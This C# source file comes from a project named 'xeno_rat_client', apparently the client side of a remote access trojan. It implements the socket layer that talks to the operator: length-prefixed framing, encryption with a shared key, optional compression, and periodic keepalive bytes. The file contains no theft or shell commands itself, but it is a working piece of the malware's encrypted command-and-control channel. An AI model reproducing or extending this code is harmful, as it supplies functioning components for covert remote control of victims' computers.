using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class header
    {
        public bool Compressed = false;
        public int OriginalFileSize;
        public int T_offset = 1;
    }
    public class SocketHandler
    {
        public Socket sock;
        public byte[] EncryptionKey;
        private int socktimeout = 0;
        public SocketHandler(Socket socket, byte[] _EncryptionKey)
        {
            sock = socket;
            sock.NoDelay = true;
            EncryptionKey = _EncryptionKey;
        }

        private async Task<byte[]> RecvAllAsync_ddos_unsafer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }


        private async Task<byte[]> RecvAllAsync_ddos_safer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }
                int availableBytes = sock.Available;

                if (availableBytes > 0)
                {
                    int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                    if (recv == 0)
                    {
                        data = null;
                        break;
                    }

                    total += recv;
                    dataLeft -= recv;
                }
                else
                {
                    if (socktimeout != 0)
                    {
                        TimeSpan elapsed = DateTime.Now - startTimestamp;
                        if (elapsed.TotalMilliseconds >= socktimeout)
                        {
                            // Timeout reached, handle accordingly
                            data = null;
                            break;
                        }
                    }

                    TimeSpan timeSinceLastSend = DateTime.Now - lastSendTime;

                    if (timeSinceLastSend.TotalMilliseconds >= 1500) // Check if 1 and a half second has passed
                    {
                        await sock.SendAsync(new ArraySegment<byte>(new byte[] { 1, 0, 0, 0, 2 }), SocketFlags.None);
                        lastSendTime = DateTime.Now; // Update the last send time
                    }

                    // Wait a short period before checking again to avoid busy waiting.
                    await Task.Delay(10);
                }
            }

            return data;
        }

        public static byte[] Concat(byte[] b1, byte[] b2)
        {
            if (b1 == null) b1 = new byte[] { };
            List<byte[]> d = new List<byte[]>();
            d.Add(b1);
            d.Add(b2);
            return d.SelectMany(a => a).ToArray();
        }
        private header ParseHeader(byte[] data)
        {
            header Header = new header();
            if (data[0] == 1)
            {
                Header.Compressed = true;
                Header.OriginalFileSize = BytesToInt(data, 1);
                Header.T_offset = 5;
            }
            else if (data[0] != 0)
            {
                return null;
            }
            return Header;
        }
        public byte[] BTruncate(byte[] bytes, int offset)
        {
            byte[] T_data = new byte[bytes.Length - offset];
            Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
            return T_data;
        }
        public async Task<bool> SendAsync(byte[] data)
        {
            if (data == null)
            {
                throw new ArgumentNullException(nameof(data), "data can not be null!");
            }

            try
            {
                data = Encryption.Encrypt(data, EncryptionKey);
                byte[] compressedData = Compression.Compress(data);
                byte didCompress = 0;
                int orgLen = data.Length;

                if (compressedData.Length < orgLen)
                {
                    data = compressedData;
                    didCompress = 1;
                }

                byte[] header = new byte[] { didCompress };
                if (didCompress == 1)
                {
                    header = Concat(header, IntToBytes(orgLen));
                }

                data = Concat(header, data);
                byte[] size = IntToBytes(data.Length);
                data = Concat(size, data);

                await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None);

                return true;
            }
            catch
            {
                return false; // should probably disconnect
            }
        }
        public async Task<byte[]> ReceiveAsync()
        {
            try
            {
                while (true)
                {
                    byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
                    if (length_data == null)
                    {
                        return null;//disconnect
                    }
                    int length = BytesToInt(length_data);
                    byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
                    if (data == null)
                    {
                        return null;//disconnect
                    }
                    if (data[0] == 2) 
                    {
                        continue;
                    }
                    header Header = ParseHeader(data);
                    if (Header == null)
                    {
                        return null;//disconnect
                    }
                    data = BTruncate(data, Header.T_offset);
                    if (Header.Compressed)
                    {
                        data = Compression.Decompress(data, Header.OriginalFileSize);
                    }
                    data = Encryption.Decrypt(data, EncryptionKey);
                    return data;
                }
            }
            catch
            {
                return null;//disconnect
            }
        }
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }
        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }


        public void SetRecvTimeout(int ms)
        {
            socktimeout = ms;
            sock.ReceiveTimeout = ms;
        }
        public void ResetRecvTimeout()
        {
            socktimeout = 0;
            sock.ReceiveTimeout = 0;
        }
    }
}
